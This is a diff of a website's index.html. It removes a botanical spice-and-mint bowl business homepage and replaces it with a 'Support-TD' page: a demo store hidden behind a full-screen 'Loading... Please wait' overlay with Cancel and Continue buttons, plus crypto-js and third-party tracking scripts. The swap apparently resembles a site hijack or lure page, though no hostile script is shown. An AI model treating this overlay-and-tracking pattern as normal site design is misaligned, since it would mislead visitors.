@@ -1,513 +1,312 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- Google Tag Manager / GA4 -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'G-0LY0HY7L01');
-    </script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SpiceBowlMint | Botanical Spicecraft & Fresh Herb Bowls | SpiceBowlMint</title>
-    <meta name="description" content="Where fresh garden mint meets whole toasted spices. Explore our interactive savory bowl architect and volatile terpene matrix.">
-    <link rel="stylesheet" href="style.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,600;0,9..144,700;0,9..144,800;1,9..144,400&family=Plus+Jakarta+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,400;1,600&display=swap" rel="stylesheet">
-</head>
-<body data-theme="light">
-    <div class="reading-progress-bar" id="readingProgress"></div>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-    <!-- Header -->
-    <header class="site-header">
-        <div class="container header-container">
-            <a href="index.html" class="brand-logo">
-                <span class="brand-crest">🌿</span>
-                <div class="brand-text">
-                    <span class="brand-name">SpiceBowlMint</span>
-                    <span class="brand-sub">Botanical Spicecraft & Herb Bowls</span>
-                </div>
-            </a>
-            <nav class="desktop-nav">
-                <a href="index.html" class="nav-link active">Home</a>
-                <a href="about.html" class="nav-link ">Our Herbology</a>
-                <a href="blog.html" class="nav-link ">Spice Journal</a>
-                <a href="contact.html" class="nav-link ">Atelier Desk</a>
-            </nav>
-            <div class="header-actions">
-                <button class="theme-toggle-btn" id="themeToggle" aria-label="Toggle Theme">
-                    <span class="theme-icon">🌓</span>
-                </button>
-                <a href="contact.html" class="btn btn-primary btn-sm">Consult Herbalist</a>
-                <button class="mobile-menu-btn" id="menuToggle" aria-label="Open Navigation Menu">
-                    <span></span><span></span><span></span>
-                </button>
-            </div>
-        </div>
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+</head>
+<body>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
     </header>
 
-    <div class="mobile-drawer" id="mobileDrawer">
-        <div class="mobile-drawer-header">
-            <span class="brand-name">SpiceBowlMint</span>
-            <button class="mobile-drawer-close" id="drawerClose">&times;</button>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-        <nav class="mobile-nav-list">
-            <a href="index.html" class="mobile-nav-link">Home</a>
-            <a href="about.html" class="mobile-nav-link">Our Herbology</a>
-            <a href="blog.html" class="mobile-nav-link">Spice Journal</a>
-            <a href="contact.html" class="mobile-nav-link">Atelier Desk</a>
-        </nav>
-    </div>
-
-    <main class="page-main-wrap">
-
-        <!-- Hero Section -->
-        <section class="hero-section">
-            <div class="container hero-grid">
-                <div class="hero-text-content">
-                    <div class="hero-badge">
-                        <span>🍃</span> Botanical Herbology & Artisanal Spicecraft
-                    </div>
-                    <h1 class="hero-title">
-                        Where Fresh <span class="highlight-mint">Garden Mint</span> Meets Whole <span class="highlight-spice">Toasted Spices</span>.
-                    </h1>
-                    <p class="hero-description">
-                        Discover the neurobiology of flavor and the physics of whole spice tempering. We craft nutrient-dense culinary grain bowls layered with cold-extracted mint emulsions, freshly ground aromatics, and roasted heirloom botanicals.
-                    </p>
-                    <div class="hero-actions">
-                        <a href="#bowlArchitect" class="btn btn-primary btn-lg">Launch Bowl Architect</a>
-                        <a href="#terpenesMatrix" class="btn btn-secondary btn-lg">Explore Spice Terpenes</a>
-                    </div>
-                    <div class="hero-stats-row">
-                        <div class="stat-item">
-                            <h4>12+</h4>
-                            <p>Heirloom Mint Varieties</p>
-                        </div>
-                        <div class="stat-item">
-                            <h4>480&deg;F</h4>
-                            <p>Whole Spice Blooming Peak</p>
-                        </div>
-                        <div class="stat-item">
-                            <h4>100%</h4>
-                            <p>Whole-Seed Terroir Sourced</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="hero-image-wrap">
-                    <img src="images/hero-botanical-spice-spread.jpg" alt="Artisanal spice spread with fresh mint and mortar pestle" class="hero-main-img">
-                    <div class="hero-floating-card">
-                        <span class="floating-icon">🌱</span>
-                        <div class="floating-text">
-                            <h5>Mentha Spicata</h5>
-                            <p>Cold-harvested Moroccan spearmint with vibrant volatile terpenes.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 1: Interactive Spice & Mint Bowl Architect -->
-        <section class="bowl-architect-section" id="bowlArchitect">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-tag">Interactive Kitchen Tool</span>
-                    <h2 class="section-title">The Spice & Mint Bowl Architect</h2>
-                    <p class="section-subtitle">Engineer your personalized savory botanical bowl by layering grain foundations, micro-harvested mints, whole-seed tempering oils, and cold herb emulsions.</p>
-                </div>
-
-                <div class="architect-grid">
-                    <!-- Controls Column -->
-                    <div class="architect-controls-card">
-                        <!-- Step 1: Grain Foundation -->
-                        <div class="control-step-group">
-                            <div class="step-label">
-                                <h4><span class="step-number">1</span> Grain Foundation</h4>
-                            </div>
-                            <div class="option-chips-grid">
-                                <button type="button" class="chip-select-btn selected" data-group="grain" data-value="Ancient Quinoa & Wild Rice">Quinoa & Wild Rice</button>
-                                <button type="button" class="chip-select-btn" data-group="grain" data-value="Spiced Farro & Barley">Spiced Farro</button>
-                                <button type="button" class="chip-select-btn" data-group="grain" data-value="Golden Toasted Millet">Toasted Millet</button>
-                                <button type="button" class="chip-select-btn" data-group="grain" data-value="Cardamom Infused Basmati">Herbal Basmati</button>
-                            </div>
-                        </div>
-
-                        <!-- Step 2: Fresh Mint & Herb Profile -->
-                        <div class="control-step-group">
-                            <div class="step-label">
-                                <h4><span class="step-number">2</span> Fresh Mint & Herb Profile</h4>
-                            </div>
-                            <div class="option-chips-grid">
-                                <button type="button" class="chip-select-btn selected" data-group="herb" data-value="Fresh Moroccan Spearmint">Moroccan Spearmint</button>
-                                <button type="button" class="chip-select-btn" data-group="herb" data-value="Crisp English Peppermint">Crisp Peppermint</button>
-                                <button type="button" class="chip-select-btn" data-group="herb" data-value="Sweet Holy Basil & Mint">Holy Basil Mint</button>
-                                <button type="button" class="chip-select-btn" data-group="herb" data-value="Pungent Thai Water Mint">Thai Water Mint</button>
-                            </div>
-                        </div>
-
-                        <!-- Step 3: Whole Spice Blooming (Tarka) -->
-                        <div class="control-step-group">
-                            <div class="step-label">
-                                <h4><span class="step-number">3</span> Whole Spice Blooming (Tarka)</h4>
-                            </div>
-                            <div class="option-chips-grid">
-                                <button type="button" class="chip-select-btn selected" data-group="spice" data-value="Toasted Cumin & Mustard Tarka">Cumin & Mustard</button>
-                                <button type="button" class="chip-select-btn" data-group="spice" data-value="Star Anise & Fennel Bloom">Star Anise & Fennel</button>
-                                <button type="button" class="chip-select-btn" data-group="spice" data-value="Crushed Coriander & Nigella">Coriander & Nigella</button>
-                                <button type="button" class="chip-select-btn" data-group="spice" data-value="Smoked Paprika & Fenugreek">Smoked Fenugreek</button>
-                            </div>
-                        </div>
-
-                        <!-- Step 4: Roasted Protein & Botanicals -->
-                        <div class="control-step-group">
-                            <div class="step-label">
-                                <h4><span class="step-number">4</span> Roasted Texture & Botanicals</h4>
-                            </div>
-                            <div class="option-chips-grid">
-                                <button type="button" class="chip-select-btn selected" data-group="top" data-value="Crispy Spiced Chickpeas">Crisp Chickpeas</button>
-                                <button type="button" class="chip-select-btn" data-group="top" data-value="Charred Turmeric Cauliflower">Turmeric Cauliflower</button>
-                                <button type="button" class="chip-select-btn" data-group="top" data-value="Glazed Heritage Carrots">Glazed Carrots</button>
-                                <button type="button" class="chip-select-btn" data-group="top" data-value="Toasted Pumpkin & Sesame Seeds">Pumpkin & Sesame</button>
-                            </div>
-                        </div>
-
-                        <!-- Step 5: Cold Herb Emulsion -->
-                        <div class="control-step-group">
-                            <div class="step-label">
-                                <h4><span class="step-number">5</span> Cold Herb Dressing Emulsion</h4>
-                            </div>
-                            <div class="option-chips-grid">
-                                <button type="button" class="chip-select-btn selected" data-group="dressing" data-value="Whipped Tahini Mint Emulsion">Whipped Tahini Mint</button>
-                                <button type="button" class="chip-select-btn" data-group="dressing" data-value="Zesty Lime & Cilantro Chutney">Lime Cilantro Chutney</button>
-                                <button type="button" class="chip-select-btn" data-group="dressing" data-value="Cultured Herb Yogurt Drizzle">Cultured Herb Yogurt</button>
-                                <button type="button" class="chip-select-btn" data-group="dressing" data-value="Cold-Pressed Mint Herb Oil">Cold-Pressed Mint Oil</button>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Live Preview Sticky Card -->
-                    <div class="architect-preview-card">
-                        <div class="preview-bowl-visual">
-                            <div class="bowl-visual-icon">🍲</div>
-                            <h3 class="bowl-calculated-name" id="previewBowlName">Moroccan Spearmint & Ancient Quinoa Harvest Bowl</h3>
-                            <span class="bowl-flavor-profile-tag" id="previewBowlFlavor">Menthol Crisp • Toasted Terpenes • Velvety Herbaceous</span>
-                        </div>
-
-                        <ul class="preview-breakdown-list">
-                            <li>
-                                <span class="label">Grain Base:</span>
-                                <span class="val" id="previewGrain">Ancient Quinoa & Wild Rice</span>
-                            </li>
-                            <li>
-                                <span class="label">Herb Profile:</span>
-                                <span class="val" id="previewHerb">Fresh Moroccan Spearmint</span>
-                            </li>
-                            <li>
-                                <span class="label">Tempering Oil:</span>
-                                <span class="val" id="previewSpice">Toasted Cumin & Mustard Tarka</span>
-                            </li>
-                            <li>
-                                <span class="label">Dressing:</span>
-                                <span class="val" id="previewDressing">Whipped Tahini Mint Emulsion</span>
-                            </li>
-                        </ul>
-
-                        <div class="flavor-radar-summary" id="previewFlavorNote">
-                            The cooling volatile menthol in Fresh Moroccan Spearmint counterbalances the rich roasted lipid notes of the Toasted Cumin & Mustard Tarka, while Whipped Tahini Mint Emulsion coats the palate for an unctuous, lingering aromatic finish.
-                        </div>
-
-                        <div style="margin-top: 1.5rem;">
-                            <a href="contact.html" class="btn btn-warm btn-sm" style="width: 100%;">Request Botanical Recipe Card</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 2: Volatile Terpenes & Essential Oil Matrix -->
-        <section class="terpenes-matrix-section" id="terpenesMatrix">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-tag">Flavor Chemistry</span>
-                    <h2 class="section-title">The Volatile Terpene & Essential Oil Matrix</h2>
-                    <p class="section-subtitle">Every pinch of spice and leaf of fresh herb is packed with hydrophobic aromatic molecules. Understand how these essential oils behave under heat, acid, and lipid emulsification.</p>
-                </div>
-
-                <div class="terpenes-grid">
-                    <div class="terpene-card">
-                        <div class="terpene-icon-badge">🍃</div>
-                        <h3>Menthol & Carvone</h3>
-                        <span class="terpene-chem-formula">C10H20O &bull; Monoterpenes</span>
-                        <p>Stimulates TRPM8 cold-sensing receptors on the tongue, producing an instant refreshing thermal sensation that lifts heavy roasted spices.</p>
-                        <div class="terpene-sources-row">
-                            <strong>Found In:</strong> Garden Spearmint, Peppermint, Field Mint
-                        </div>
-                    </div>
-
-                    <div class="terpene-card">
-                        <div class="terpene-icon-badge">🌰</div>
-                        <h3>Cuminaldehyde</h3>
-                        <span class="terpene-chem-formula">C10H12O &bull; Aromatic Aldehyde</span>
-                        <p>The earthy, warm, pungent backbone of toasted cumin seeds. Highly lipophilic; unlocks deeply when bloomed in hot ghee or mustard oil.</p>
-                        <div class="terpene-sources-row">
-                            <strong>Found In:</strong> Whole Cumin Seeds, Caraway, Black Cumin
-                        </div>
-                    </div>
-
-                    <div class="terpene-card">
-                        <div class="terpene-icon-badge">🌶️</div>
-                        <h3>Piperine & Guineensine</h3>
-                        <span class="terpene-chem-formula">C17H19NO3 &bull; Alkaloid</span>
-                        <p>Activates TRPV1 pain and heat receptors, stimulating salivary enzymes and multiplying the bioavailability of companion spice nutrients.</p>
-                        <div class="terpene-sources-row">
-                            <strong>Found In:</strong> Black Malabar Pepper, Tellicherry Peppercorns
-                        </div>
-                    </div>
-
-                    <div class="terpene-card">
-                        <div class="terpene-icon-badge">🥢</div>
-                        <h3>Cinnamaldehyde</h3>
-                        <span class="terpene-chem-formula">C9H8O &bull; Phenylpropanoid</span>
-                        <p>Delivers sweet, woody, comforting resonance with subtle numbing qualities. Degrades slowly under dry roasting, infusing grains with lasting warmth.</p>
-                        <div class="terpene-sources-row">
-                            <strong>Found In:</strong> Ceylon True Cinnamon, Cassia Bark
-                        </div>
-                    </div>
-
-                    <div class="terpene-card">
-                        <div class="terpene-icon-badge">⭐</div>
-                        <h3>Trans-Anethole</h3>
-                        <span class="terpene-chem-formula">C10H12O &bull; Phenolic Ether</span>
-                        <p>Provides sweet licorice and floral anise notes that bridge bitter greens with savory legumes and toasted grain foundations.</p>
-                        <div class="terpene-sources-row">
-                            <strong>Found In:</strong> Star Anise, Fennel Seeds, Sweet Chervil
-                        </div>
-                    </div>
-
-                    <div class="terpene-card">
-                        <div class="terpene-icon-badge">🌿</div>
-                        <h3>Eugenol & Cineole</h3>
-                        <span class="terpene-chem-formula">C10H12O2 &bull; Allylbenzene</span>
-                        <p>Warm, clove-like aromatic with natural antiseptic and soothing properties. Pairs exceptionally with citrus zest and crushed coriander.</p>
-                        <div class="terpene-sources-row">
-                            <strong>Found In:</strong> Whole Cloves, Holy Basil, Bay Laurel, Allspice
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 3: 5 Pillars of Botanical Spicecraft -->
-        <section class="pillars-section">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-tag">Culinary Foundation</span>
-                    <h2 class="section-title">The Five Pillars of Botanical Spicecraft</h2>
-                    <p class="section-subtitle">Our kitchen operates on five fundamental principles that preserve the aromatic integrity of whole botanicals from harvest to bowl.</p>
-                </div>
-
-                <div class="pillars-grid">
-                    <div class="pillar-card">
-                        <div class="pillar-number">01</div>
-                        <h3>Whole-Seed Toasting</h3>
-                        <p>Dry-toasting whole seeds at 280&deg;F activates inner essential oils before grinding, eliminating raw grassy flavors in favor of rich nutty pyrazines.</p>
-                    </div>
-
-                    <div class="pillar-card">
-                        <div class="pillar-number">02</div>
-                        <h3>Friction-Based Milling</h3>
-                        <p>Heavy granite mortar and pestle crushing uses shear pressure rather than high-speed blade friction, preventing thermal volatile evaporation.</p>
-                    </div>
-
-                    <div class="pillar-card">
-                        <div class="pillar-number">03</div>
-                        <h3>Cold Mint Harvesting</h3>
-                        <p>Micro-harvesting fresh mint at dawn locks in maximum leaf turgor and minimizes enzymatic polyphenol oxidase browning during dressing prep.</p>
-                    </div>
-
-                    <div class="pillar-card">
-                        <div class="pillar-number">04</div>
-                        <h3>Hot Lipid Blooming (Tarka)</h3>
-                        <p>Flash-tempering whole mustard, cumin, and curry leaves in shimmering cold-pressed oil dissolves hydrophobic terpenes directly into the fat phase.</p>
-                    </div>
-
-                    <div class="pillar-card">
-                        <div class="pillar-number">05</div>
-                        <h3>Acid-Fat Balance</h3>
-                        <p>Pairing heavy toasted spice oils with vibrant cold mint chutneys and fresh citrus zest cleanses the palate and promotes digestive equilibrium.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 4: Seasonal Herb & Spice Harmonizer -->
-        <section class="seasonal-harmonizer-section">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-tag">Agronomic Calendar</span>
-                    <h2 class="section-title">Seasonal Herb & Spice Harmonizer</h2>
-                    <p class="section-subtitle">Aligning kitchen spice blends with seasonal harvest cycles maximizes both nutritional density and gustatory vitality.</p>
-                </div>
-
-                <div class="season-tabs-nav">
-                    <button class="season-tab-btn active" data-season="spring">Spring Awakening</button>
-                    <button class="season-tab-btn" data-season="summer">Summer Solstice</button>
-                    <button class="season-tab-btn" data-season="autumn">Autumn Equinox</button>
-                    <button class="season-tab-btn" data-season="winter">Winter Hearth</button>
-                </div>
-
-                <!-- Spring -->
-                <div class="season-content-card active" id="season-spring">
-                    <div class="season-info">
-                        <span class="season-focus-tag">Fresh Herbs & Detoxifying Bitter Greens</span>
-                        <h3>Spring: The Mint & Coriander Revival</h3>
-                        <p>As young herb shoots emerge from the soil, spring cooking emphasizes light, aromatic botanicals that stimulate sluggish winter digestion. Tender garden mint, baby cilantro, and green coriander berries take center stage.</p>
-                        <ul class="season-highlights-list">
-                            <li><span class="check">✔</span> Key Mint: Tender Apple Mint & Young Spearmint</li>
-                            <li><span class="check">✔</span> Spices: Green Cardamom, Cumin Seed, Crushed Fennel</li>
-                            <li><span class="check">✔</span> Grain Foundation: Sprouted Quinoa & Spring Peas</li>
-                            <li><span class="check">✔</span> Dressing: Cold Lemon-Mint Tahini Drizzle</li>
-                        </ul>
-                    </div>
-                    <div class="season-image-wrap">
-                        <img src="images/fresh-mint-leaves-garden.jpg" alt="Vibrant fresh garden mint leaves in morning spring light">
-                    </div>
-                </div>
-
-                <!-- Summer -->
-                <div class="season-content-card" id="season-summer">
-                    <div class="season-info">
-                        <span class="season-focus-tag">Cooling Menthol & Citrus Zing</span>
-                        <h3>Summer: High-Menthol Crispness</h3>
-                        <p>High summer heat demands culinary cooling. Moroccan spearmint, lime zest, and cold-extracted herb oils quench thirst and refresh overheated palates while light grains provide clean sustenance.</p>
-                        <ul class="season-highlights-list">
-                            <li><span class="check">✔</span> Key Mint: Moroccan Spearmint & Thai Water Mint</li>
-                            <li><span class="check">✔</span> Spices: Sumac, Coriander, Black Mustard Seed</li>
-                            <li><span class="check">✔</span> Grain Foundation: Chilled Farro with Cucumbers & Radishes</li>
-                            <li><span class="check">✔</span> Dressing: Lime-Herb Emulsified Vinaigrette</li>
-                        </ul>
-                    </div>
-                    <div class="season-image-wrap">
-                        <img src="images/nourishing-quinoa-spice-bowl.jpg" alt="Vibrant summer quinoa bowl with fresh herbs and citrus dressing">
-                    </div>
-                </div>
-
-                <!-- Autumn -->
-                <div class="season-content-card" id="season-autumn">
-                    <div class="season-info">
-                        <span class="season-focus-tag">Earthy Roots & Warming Aromatics</span>
-                        <h3>Autumn: The Turmeric & Cardamom Hearth</h3>
-                        <p>As crisp autumn winds arrive, our kitchen shifts toward grounding root crops, deeply roasted grains, and warming spices that nurture the body through changing temperatures.</p>
-                        <ul class="season-highlights-list">
-                            <li><span class="check">✔</span> Key Mint: Sweet Holy Basil & Peppermint</li>
-                            <li><span class="check">✔</span> Spices: Alleppey Turmeric, Star Anise, Black Pepper</li>
-                            <li><span class="check">✔</span> Grain Foundation: Toasted Millet & Roasted Butternut Squash</li>
-                            <li><span class="check">✔</span> Dressing: Warm Spiced Ghee Tarka with Garlic</li>
-                        </ul>
-                    </div>
-                    <div class="season-image-wrap">
-                        <img src="images/roasted-mediterranean-grain-bowl.jpg" alt="Warm roasted autumn grain bowl with toasted spices and roots">
-                    </div>
-                </div>
-
-                <!-- Winter -->
-                <div class="season-content-card" id="season-winter">
-                    <div class="season-info">
-                        <span class="season-focus-tag">Deep Smoke, Pungency & Cinnamon Bark</span>
-                        <h3>Winter: Deep Thermal Resilience</h3>
-                        <p>Winter requires concentrated caloric warmth and rich fat-bloomed spices. Smoked chilies, Ceylon cinnamon, and slow-simmered legumes fortify vitality and comfort.</p>
-                        <ul class="season-highlights-list">
-                            <li><span class="check">✔</span> Key Mint: Dried Winter Mint Flakes & Peppermint Oil</li>
-                            <li><span class="check">✔</span> Spices: Ceylon Cinnamon, Whole Cloves, Smoked Paprika</li>
-                            <li><span class="check">✔</span> Grain Foundation: Spiced Black Forbidden Rice & Lentils</li>
-                            <li><span class="check">✔</span> Dressing: Velvety Roasted Garlic & Ginger Glaze</li>
-                        </ul>
-                    </div>
-                    <div class="season-image-wrap">
-                        <img src="images/whole-spices-cinnamon-star-anise.jpg" alt="Rich whole spices including cinnamon bark and star anise on dark stone">
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 5: Atelier Manifesto & Newsletter CTA -->
-        <section class="manifesto-cta-section">
-            <div class="container">
-                <div class="manifesto-box">
-                    <h2>Join the Botanical Kitchen Atelier</h2>
-                    <p>Receive monthly monographs on spice grinding thermodynamics, rare heirloom mint varietals, and chef-curated grain bowl recipes delivered straight to your inbox.</p>
-                    <form class="newsletter-form" onsubmit="event.preventDefault(); alert('Thank you for subscribing to the SpiceBowlMint Journal.');">
-                        <input type="email" class="newsletter-input" placeholder="Enter your email address" required>
-                        <button type="submit" class="btn btn-primary">Subscribe</button>
-                    </form>
-                    <p class="form-privacy-note">We respect your privacy. Zero spam. Unsubscribe at any time.</p>
-                </div>
-            </div>
-        </section>
-
-    </main>
-
-    <!-- Footer -->
-    <footer class="site-footer">
-        <div class="container">
-            <div class="footer-top">
-                <div class="footer-brand-col">
-                    <div class="brand-logo">
-                        <span class="brand-crest">🌿</span>
-                        <div class="brand-text">
-                            <span class="brand-name">SpiceBowlMint</span>
-                            <span class="brand-sub">Botanical Spicecraft</span>
-                        </div>
-                    </div>
-                    <p>An independent culinary research studio and botanical kitchen dedicated to whole spice tempering, fresh mint varietals, and the science of nutrient-dense savory grain bowls.</p>
-                    <div class="footer-coordinates">
-                        <p>📍 340 S Lemon Ave, Walnut, CA 91789, United States</p>
-                        <p>📞 +1-800-472-8321</p>
-                        <p>✉️ concierge@spicebowlmint.com</p>
-                    </div>
-                </div>
-                <div class="footer-nav-col">
-                    <h4>Botanical Chapters</h4>
-                    <ul>
-                        <li><a href="index.html">Bowl Architect</a></li>
-                        <li><a href="about.html">Herbarium Philosophy</a></li>
-                        <li><a href="blog.html">Spice Journal</a></li>
-                        <li><a href="contact.html">Atelier Desk</a></li>
-                    </ul>
-                </div>
-                <div class="footer-nav-col">
-                    <h4>Spice Monographs</h4>
-                    <ul>
-                        <li><a href="blog/the-chemistry-of-fresh-mint-menthol-volatiles-varietals-and-culinary-pairings.html">Fresh Mint Chemistry</a></li>
-                        <li><a href="blog/whole-spice-tempering-science-the-physics-of-tarka-essential-oil-extraction-and-blooming.html">Tempering & Tarka Science</a></li>
-                        <li><a href="blog/mortar-and-pestle-vs-blade-grinding-friction-heat-cell-lysis-and-flavor-preservation.html">Mortar Milling Physics</a></li>
-                        <li><a href="blog/building-the-ultimate-nourishing-spice-bowl-grain-foundations-herb-emulsions-and-crunch-layers.html">Savory Bowl Architecture</a></li>
-                    </ul>
